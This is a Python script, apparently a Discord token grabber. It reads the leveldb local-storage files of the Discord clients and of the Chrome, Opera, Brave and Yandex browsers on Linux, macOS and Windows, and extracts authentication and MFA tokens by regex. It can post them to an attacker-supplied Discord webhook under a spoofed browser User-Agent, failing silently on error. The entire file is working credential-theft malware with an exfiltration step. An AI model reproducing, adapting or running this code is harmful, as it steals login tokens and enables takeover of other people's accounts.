import os
import re
import json
import platform

# enable or not sending token to a Discord server
WEBHOOK_ENABLE = False

# your Discord webhook URL
WEBHOOK_URL = 'WEBHOOK HERE'

def find_tokens(path):
    path += '/Local Storage/leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}/{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    system = platform.system()
    print(f'Operating System detected: \033[0;36m{system}\033[0m')

    if system == 'Linux':
        home = os.path.expanduser("~")
        
        paths = {
            'Discord': os.path.join(home, '.discord'),
            'Discord Canary': os.path.join(home, '.discordcanary'),
            'Discord PTB': os.path.join(home, '.discordptb'),
            'Google Chrome': os.path.join(home, '.config/google-chrome/Default'),
            'Opera': os.path.join(home, '.config/opera/Default'),
            'Brave': os.path.join(home, '.config/BraveSoftware/Brave-Browser/Default'),
            'Yandex': os.path.join(home, '.config/yandex-browser/Default')
        }

    elif system == 'Darwin':
        local = os.path.expanduser('~/Library/Application Support')
        
        paths = {
            'Discord': os.path.join(local, 'Discord'),
            'Discord Canary': os.path.join(local, 'discordcanary'),
            'Discord PTB': os.path.join(local, 'discordptb'),
            'Google Chrome': os.path.join(local, 'Google/Chrome/Default'),
            'Opera': os.path.join(local, 'com.operasoftware.Opera'),
            'Brave': os.path.join(local, 'BraveSoftware/Brave-Browser/Default'),
            'Yandex': os.path.join(local, 'Yandex/YandexBrowser/Default')
        }

    elif system == 'Windows':
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')

        paths = {
            'Discord': roaming + '/Discord',
            'Discord Canary': roaming + '/discordcanary',
            'Discord PTB': roaming + '/discordptb',
            'Google Chrome': local + '/Google/Chrome/User Data/Default',
            'Opera': roaming + '/Opera Software/Opera Stable',
            'Brave': local + '/BraveSoftware/Brave-Browser/User Data/Default',
            'Yandex': local + '/Yandex/YandexBrowser/User Data/Default'
        }

    message = ''

    for client, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n[{client}]\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'\033[0;32m{token}\033[0m\n'
        else:
            message += '\033[0;31mNo tokens found.\033[0m\n'

    if WEBHOOK_ENABLE == False:
        print(f'{message}')

    elif WEBHOOK_ENABLE == True:
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
        }

        payload = json.dumps({'content': f'```txt{message}```'})

        try:
            from urllib.request import Request, urlopen
            req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
            urlopen(req)
            print('Result has been sent to the discord server.')
        except:
            pass

if __name__ == '__main__':
    main()
